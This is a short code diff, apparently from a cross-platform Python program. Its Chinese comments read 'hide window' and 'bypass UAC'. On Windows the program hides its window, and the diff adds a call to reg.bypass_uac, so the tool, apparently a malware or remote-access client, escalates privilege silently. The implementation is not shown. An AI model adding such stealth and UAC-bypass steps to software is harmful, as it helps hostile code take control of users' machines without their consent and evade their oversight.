@@ -21,6 +21,8 @@ def main():
         plat = 'win'
         # 隐藏窗口
         util.hide_windows(1)
+        # 绕过 UAC
+        reg.bypass_uac(plat)
     elif plat.startswith('linux'):
         plat = 'nix'
     elif plat.startswith('darwin'):
